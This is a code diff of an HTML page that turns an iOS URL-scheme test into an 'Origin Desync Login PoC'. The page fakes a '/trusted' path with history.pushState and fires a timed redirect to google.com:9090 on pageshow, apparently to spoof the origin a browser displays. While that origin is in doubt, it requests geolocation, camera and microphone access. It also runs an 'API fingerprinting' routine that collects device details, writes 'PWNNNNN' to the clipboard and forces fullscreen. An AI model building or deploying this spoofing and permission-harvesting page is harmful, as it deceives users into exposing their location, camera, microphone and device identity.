@@ -2,102 +2,221 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>iOS Web Intent‑Like Test PoC</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Origin Desync Login PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
 body {
+  margin:0;
   font-family:-apple-system,BlinkMacSystemFont,system-ui;
   background:#f5f5f7;
-  margin:0;
 }
-#box {
-  max-width:460px;
-  margin:70px auto;
-  background:#fff;
-  padding:22px;
-  border-radius:14px;
-  box-shadow:0 20px 60px rgba(0,0,0,.25);
-}
+
 button {
-  display:block;
-  width:100%;
-  margin:10px 0;
-  padding:12px;
-  font-size:15px;
-  border:none;
-  border-radius:10px;
-  background:#007aff;
-  color:#fff;
+  margin:6px;
+  font-size:14px;
+  padding:8px 12px;
 }
+
+#panel {
+  display:none;
+  max-width:520px;
+  margin:60px auto;
+  background:#fff;
+  padding:24px;
+  border-radius:16px;
+  box-shadow:0 20px 60px rgba(0,0,0,.2);
+}
+
+h2 { text-align:center; margin-bottom:6px; }
+.sub { text-align:center; color:#666; margin-bottom:20px; }
+
+.notice {
+  margin-top:14px;
+  font-size:13px;
+  color:#b00020;
+}
+
+video { width:100%; margin-top:10px; }
+
 pre {
+  margin-top:12px;
   background:#111;
   color:#0f0;
-  padding:12px;
-  font-size:12px;
-  max-height:220px;
+  padding:10px;
+  font-size:11px;
+  max-height:260px;
   overflow:auto;
 }
-.small { font-size:12px; color:#666; }
 </style>
 </head>
 
 <body>
 
-<div id="box">
-  <h3>iOS Web “Intent” Test</h3>
-  <p class="small">
-    Test only — observing iOS system handling<br>
-    (not an exploit)
-  </p>
+<div style="text-align:center">
+  <button id="trigger">Start PoC</button>
+</div>
 
-  <button onclick="openScheme('fb://profile')">
-    Test: fb:// (Facebook)
-  </button>
+<div id="panel">
+  <h2>Demo</h2>
+  <div class="sub">This is a proof of concept for origin desynchronization.</div>
 
-  <button onclick="openScheme('googlechrome://')">
-    Test: googlechrome://
-  </button>
+  <hr>
 
-  <button onclick="openScheme('calculator://')">
-    Test: calculator:// (expected fail)
-  </button>
+  <button onclick="getLocation()">Get Location</button>
+  <p id="locationOutput">Location: -</p>
 
-  <button onclick="openHTTPS()">
-    Control: normal HTTPS navigation
-  </button>
+  <button onclick="openCamera()">Open Camera</button>
+  <video id="camera" autoplay playsinline></video>
 
-  <pre id="log"></pre>
+  <hr>
+
+  <!-- 🔥 API FINGERPRINTING -->
+  <button onclick="callAllAPIs()">CALL ALL APIs</button>
+  <button onclick="clearLog()">CLEAR LOG</button>
+  <pre id="apiLog"></pre>
+
+  <div class="notice">
+    Demo only — browser permission required
+  </div>
 </div>
 
 <script>
-const log = m =>
-  document.getElementById('log').textContent += m + "\n";
+const panel = document.getElementById('panel');
+const trigger = document.getElementById('trigger');
+const apiLog = document.getElementById('apiLog');
 
-function openScheme(scheme) {
-  log("[*] Trying scheme: " + scheme);
-
-  const start = Date.now();
-
-  // iframe trick — common *test* method
-  const iframe = document.createElement('iframe');
-  iframe.style.display = 'none';
-  iframe.src = scheme;
-  document.body.appendChild(iframe);
-
-  setTimeout(() => {
-    document.body.removeChild(iframe);
-    log("[*] Returned after " + (Date.now() - start) + "ms");
-    log("    (If app exists, iOS may prompt or switch)");
-  }, 1500);
+/* ======================
+   FUNGSI ASLI (TIDAK DIUBAH)
+====================== */
+function getLocation() {
+  const output = document.getElementById('locationOutput');
+  if (!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(
+    pos => output.textContent =
+      `${pos.coords.latitude}, ${pos.coords.longitude}`,
+    () => output.textContent = 'Permission denied'
+  );
 }
 
-function openHTTPS() {
-  log("[*] Navigating to https://example.com");
-  location.href = "https://google.com:80";
+function openCamera() {
+  navigator.mediaDevices.getUserMedia({ video:true })
+    .then(s => camera.srcObject = s)
+    .catch(()=>alert('Camera denied'));
+}
+
+trigger.onclick = () => {
+  history.pushState({}, '', '/trusted');
+  panel.style.display = 'block';
+};
+
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = 'https://google.com:9090';
+      }, 80);
+    });
+  });
+});
+
+/* ======================
+   API FINGERPRINTING
+====================== */
+const log = m => apiLog.textContent += m + "\n";
+const clearLog = () => apiLog.textContent = "";
+
+async function callAllAPIs() {
+  log("=== API FINGERPRINT START ===");
+
+  // Storage
+  localStorage.setItem('a','1');
+  sessionStorage.setItem('b','1');
+  indexedDB.open('PWNNNNN');
+  log("Storage: OK");
+
+  // Clipboard
+  try { await navigator.clipboard.writeText("PWNNNNN"); log("Clipboard: OK"); }
+  catch { log("Clipboard: DENIED"); }
+
+  // Notification
+  if (Notification) log("Notification: " + await Notification.requestPermission());
+
+  // Battery
+  if (navigator.getBattery) {
+    const b = await navigator.getBattery();
+    log("Battery: " + Math.round(b.level*100) + "%");
+  }
+
+  // Network
+  if (navigator.connection)
+    log("Network: " + navigator.connection.effectiveType);
+
+  // Vibration
+  navigator.vibrate?.(100);
+
+  // Orientation / Motion
+  addEventListener('deviceorientation', e => log("Orientation: "+e.alpha), {once:true});
+  addEventListener('devicemotion', ()=>log("Motion: OK"), {once:true});
+
+  // Speech
+  speechSynthesis.speak(new SpeechSynthesisUtterance("API fingerprint"));
+  log("Speech synthesis: OK");
+
+  const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
+  log("Speech recognition: " + (SR ? "SUPPORTED":"NO"));
+
+  // Fullscreen
+  document.documentElement.requestFullscreen().catch(()=>{}); 
+  log("Fullscreen: requested");
+
+  // Visibility
+  log("Visibility: " + document.visibilityState);
+
+  // Performance
+  log("Performance.now: " + performance.now());
+
+  // Canvas / WebGL
+  const c = document.createElement('canvas');
+  c.getContext('2d').fillRect(0,0,10,10);
+  log("Canvas: OK");
+  log("WebGL: " + (c.getContext('webgl') ? "OK":"NO"));
+
+  // Gamepad
+  log("Gamepads: " + navigator.getGamepads().length);
+
+  // WebRTC audio
+  try {
+    await navigator.mediaDevices.getUserMedia({audio:true});
+    log("WebRTC audio: OK");
+  } catch { log("WebRTC audio: DENIED"); }
+
+  // Screen
+  log(`Screen: ${screen.width}x${screen.height}`);
+
+  // Lang / TZ
+  log("Lang: " + navigator.language);
+  log("TZ: " + Intl.DateTimeFormat().resolvedOptions().timeZone);
+
+  // Online
+  log("Online: " + navigator.onLine);
+
+  // Permissions
+  if (navigator.permissions) {
+    for (const p of ['camera','microphone','geolocation','notifications']) {
+      try {
+        const r = await navigator.permissions.query({name:p});
+        log(`Perm ${p}: ${r.state}`);
+      } catch {}
+    }
+  }
+
+  log("=== API FINGERPRINT END ===");
 }
 </script>
 
 </body>
 </html>
+
+
 
